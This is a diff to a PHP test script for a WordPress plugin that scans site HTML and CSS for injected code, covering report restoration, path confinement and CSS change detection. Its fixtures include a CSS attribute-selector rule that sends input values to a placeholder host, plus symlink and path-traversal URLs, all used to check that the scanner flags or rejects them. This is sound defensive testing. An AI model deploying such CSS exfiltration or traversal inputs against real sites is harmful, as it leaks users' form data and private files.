@@ -3,6 +3,7 @@ if (PHP_SAPI !== 'cli') { exit; }
 define('ABSPATH', '/tmp/');
 define('ARRAY_A', 'ARRAY_A');
 define('TK_URL', 'https://site.test/wp-content/plugins/tool-kits/');
+define('WP_CONTENT_DIR', sys_get_temp_dir() . '/tk-html-css-' . bin2hex(random_bytes(6)));
 $checks = 0; $options = array(); $transients = array(); $mutations = array(); $requests = array(); $actions = array(); $enqueued = array();
 $capable = true; $manageable = true; $licensed = true; $nonce_valid = true; $user = 7;
 error_reporting(E_ALL);
@@ -27,6 +28,8 @@ function get_transient($key) { return $GLOBALS['transients'][$key] ?? false; }
 function set_transient($key, $value, $ttl) { check_scan($ttl === 1800, 'Job lifetime unbounded'); $GLOBALS['transients'][$key] = $value; }
 function delete_transient($key) { unset($GLOBALS['transients'][$key]); }
 function home_url($path = '/') { return 'https://site.test' . $path; }
+function content_url($path = '/') { return 'https://site.test/wp-content' . $path; }
+function includes_url($path = '/') { return 'https://site.test/wp-includes' . $path; }
 function admin_url($path) { return 'https://site.test/wp-admin/' . $path; }
 function wp_parse_url($url) { return parse_url($url); }
 function get_posts($args) { check_scan($args['post_status'] === 'publish' && $args['has_password'] === false && $args['numberposts'] <= 51, 'Private posts fetched or discovery unbounded'); return array(1, 2, 3); }
@@ -56,6 +59,7 @@ function add_action($name, $callback, $priority = 10) { $GLOBALS['actions'][$nam
 function add_submenu_page(...$args) { $GLOBALS['menu'] = $args; }
 function tk_asset_version($path) { return 'fixture'; }
 function wp_enqueue_script(...$args) { $GLOBALS['enqueued'][] = $args; }
+function wp_enqueue_style(...$args) { $GLOBALS['enqueued'][] = $args; }
 class HTML_Scan_DB {
     public $posts = 'fixture_posts'; public $postmeta = 'fixture_postmeta'; public $options = 'fixture_options'; public $last_error = ''; public $queries = array(); public $data;
     public function __construct() {
@@ -86,7 +90,7 @@ tk_html_scan_init();
 check_scan(isset($actions['wp_ajax_tk_html_scan_start'], $actions['wp_ajax_tk_html_scan_step']) && !isset($actions['wp_ajax_nopriv_tk_html_scan_start']), 'Public scan endpoints registered');
 tk_html_scan_register_page(); check_scan($menu[4] === 'tool-kits-html-scanner', 'Scanner menu missing');
 $_GET = array('page' => 'unrelated'); tk_html_scan_enqueue(); check_scan(!$enqueued, 'Scanner JS loaded on unrelated screen');
-$_GET['page'] = 'tool-kits-html-scanner'; tk_html_scan_enqueue(); check_scan(count($enqueued) === 1, 'Scanner JS not scoped to own page');
+$_GET['page'] = 'tool-kits-html-scanner'; tk_html_scan_enqueue(); check_scan(count($enqueued) === 2, 'Scanner JS/CSS not scoped to own page');
 
 $original_data = $wpdb->data;
 foreach (array('capable', 'manageable', 'licensed', 'nonce_valid') as $flag) {
@@ -140,4 +144,62 @@ check_scan($step->data['report']['counts']['posts'] === 25 && $step->data['repor
 request_scan('cancel', array('token' => $token));
 require dirname(__DIR__) . '/includes/cache.php';
 check_scan(tk_page_cache_should_ignore_option_change('tk_html_scan_report') && tk_page_cache_should_ignore_option_change('tk_html_scan_lock'), 'Scan progress purges frontend page cache');
+// Audit records, manual restoration and persistence across future scans.
+$audit = array('report' => array('findings' => array(), 'suppressed' => array(), 'issues' => array()), 'restored' => array());
+$safe = TK_HTML_Injection_Engine::scan('<link rel=stylesheet href=/style.css media=print onload="this.media=\'all\'">', home_url('/'))['suppressed'][0];
+tk_html_scan_record($audit, $safe, 'Public HTML / ' . home_url('/'), home_url('/'));
+$audit['report']['status'] = 'complete'; $audit['report']['counts'] = array('posts' => 0, 'meta' => 0, 'options' => 0, 'urls' => 1);
+update_option('tk_html_scan_report', $audit['report'], false); $fingerprint = $audit['report']['suppressed'][0]['fingerprint'];
+foreach (array('capable', 'manageable', 'licensed', 'nonce_valid') as $flag) { $GLOBALS[$flag] = false; $before = $options; check_scan(request_scan('restore', array('fingerprint' => $fingerprint))->status === 403 && $before === $options, 'Unauthorized restore changed report: ' . $flag); $GLOBALS[$flag] = true; }
+check_scan(request_scan('restore', array('fingerprint' => $fingerprint), 'GET')->status === 405, 'GET restored a finding');
+check_scan(request_scan('restore', array('fingerprint' => array()))->status === 400, 'Array fingerprint accepted');
+$options['tk_html_scan_lock'] = array('expires' => time() + 120);
+check_scan(request_scan('restore', array('fingerprint' => $fingerprint))->status === 409, 'Restore raced an active scan'); unset($options['tk_html_scan_lock']);
+$before_restore_rows = $wpdb->data;
+$restored_reply = request_scan('restore', array('fingerprint' => $fingerprint));
+check_scan($restored_reply->success && !$restored_reply->data['report']['suppressed'] && $restored_reply->data['report']['findings'][0]['action'] === 'REVIEW' && isset($options['tk_html_scan_restored'][$fingerprint]), 'Restore lost audit evidence or did not persist override');
+check_scan(request_scan('restore', array('fingerprint' => $fingerprint))->status === 404, 'Restored fingerprint replay accepted');
+check_scan($wpdb->data === $before_restore_rows, 'Restore mutated site content');
+// Real local CSS reads, shared imports, path confinement, hash cache and reference changes.
+mkdir(WP_CONTENT_DIR . '/themes/demo', 0700, true);
+$outside = sys_get_temp_dir() . '/tk-private-' . bin2hex(random_bytes(6)) . '.css'; file_put_contents($outside, 'PRIVATE_SECRET_NOT_READ');
+register_shutdown_function(function () use ($outside) {
+    $remove = function ($path) use (&$remove) { foreach (new FilesystemIterator($path) as $entry) { if ($entry->isLink() || $entry->isFile()) { unlink($entry->getPathname()); } else { $remove($entry->getPathname()); } } rmdir($path); };
+    $remove(WP_CONTENT_DIR); unlink($outside);
+});
+file_put_contents(WP_CONTENT_DIR . '/themes/demo/style.css', '@import "../shared.css";body{color:red}');
+file_put_contents(WP_CONTENT_DIR . '/themes/shared.css', 'input[value^="a"]{background:url(https://bad.test/leak)}');
+symlink($outside, WP_CONTENT_DIR . '/themes/demo/escape.css');
+file_put_contents(WP_CONTENT_DIR . '/private.php', 'PRIVATE_CONFIG_NOT_READ'); symlink(WP_CONTENT_DIR . '/private.php', WP_CONTENT_DIR . '/themes/demo/config.css');
+$css_url = home_url('/wp-content/themes/demo/style.css');
+check_scan(tk_html_scan_css_path($css_url) === realpath(WP_CONTENT_DIR . '/themes/demo/style.css'), 'Valid WordPress CSS path rejected');
+foreach (array(home_url('/wp-content/themes/demo/escape.css'), home_url('/wp-content/themes/demo/config.css'), home_url('/wp-content/%2e%2e/private.css'), home_url('/wp-content/../../private.css'), 'https://evil.test/wp-content/themes/demo/style.css', home_url('/wp-content/themes/demo/style.php')) as $unsafe) { check_scan(tk_html_scan_css_path($unsafe) === '', 'Unsafe file path accepted: ' . $unsafe); }
+$wpdb->data = array('posts' => array(), 'meta' => array(), 'options' => array());
+$start = request_scan('start'); $css_token = $start->data['token']; $css_state = $transients['tk_html_scan_job_' . $css_token];
+tk_html_scan_queue_css($css_state, array($css_url . '?ver=1', $css_url . '?ver=2'), home_url('/'), array(home_url('/')));
+tk_html_scan_queue_css($css_state, array($css_url), home_url('/about/'), array(home_url('/about/')));
+check_scan(count($css_state['css_queue']) === 1, 'Same CSS queued repeatedly for cache-busting URLs or pages');
+$css_state['phase'] = 'css'; tk_html_scan_css_step($css_state);
+if ($css_state['phase'] !== 'done') { tk_html_scan_css_step($css_state); }
+check_scan($css_state['phase'] === 'done' && $css_state['report']['files_analyzed'] === 2 && in_array('css_exfiltration', array_column($css_state['report']['findings'], 'rule'), true), 'Local imported stylesheet not analyzed');
+$css_finding = array_values(array_filter($css_state['report']['findings'], function ($f) { return $f['rule'] === 'css_exfiltration'; }))[0];
+check_scan(count($css_finding['affected_urls']) === 2 && $css_finding['occurrences'] === 2, 'CSS findings lost affected pages');
+tk_html_scan_queue_css($css_state, array($css_url), home_url('/third/'), array(home_url('/third/')));
+$propagated = array_values(array_filter($css_state['report']['findings'], function ($f) { return $f['rule'] === 'css_exfiltration'; }))[0];
+check_scan(count($propagated['affected_urls']) === 3 && $propagated['occurrences'] === 3 && !$css_state['css_queue'], 'Already analyzed imported CSS lost later affected pages or was scanned twice');
+check_scan(strpos(json_encode($css_state['report']), 'PRIVATE_SECRET_NOT_READ') === false, 'Outside-root CSS contents leaked into report');
+tk_html_scan_persist($css_state); $baseline = $options['tk_html_scan_css_baseline']; request_scan('cancel', array('token' => $css_token));
+file_put_contents(WP_CONTENT_DIR . '/themes/demo/style.css', 'body{color:blue}');
+$start = request_scan('start'); $css_token = $start->data['token']; $css_state = $transients['tk_html_scan_job_' . $css_token];
+tk_html_scan_queue_css($css_state, array($css_url), home_url('/')); $css_state['phase'] = 'css'; tk_html_scan_css_step($css_state);
+check_scan(in_array('css_file_changed', array_column($css_state['report']['findings'], 'rule'), true) && $css_state['baseline'] === $baseline, 'Changed CSS silently rebaselined or labeled clean');
+request_scan('cancel', array('token' => $css_token));
+check_scan(request_scan('start', array('trusted_hosts' => '*.example.com'))->status === 400, 'New wildcard trust accepted');
+$copy_css = 'body{background:url(https://external.test/bg.png)}';
+file_put_contents(WP_CONTENT_DIR . '/themes/demo/copy-a.css', $copy_css); file_put_contents(WP_CONTENT_DIR . '/themes/demo/copy-b.css', $copy_css);
+$start = request_scan('start'); $css_token = $start->data['token']; $copies = $transients['tk_html_scan_job_' . $css_token];
+tk_html_scan_queue_css($copies, array(home_url('/wp-content/themes/demo/copy-a.css'), home_url('/wp-content/themes/demo/copy-b.css')), home_url('/'));
+$copies['phase'] = 'css'; tk_html_scan_css_step($copies);
+check_scan($copies['report']['files_analyzed'] === 2 && count($copies['css_cache']) === 1 && count($copies['report']['findings']) === 2, 'Identical CSS was reparsed or distinct file locations merged');
+request_scan('cancel', array('token' => $css_token));
 echo 'PASS: ' . $checks . " scanner access/nonce checks, read-only bounded DB/HTTP, cursors, ownership, cancellation, report escaping, incomplete coverage and cache exclusions\n";
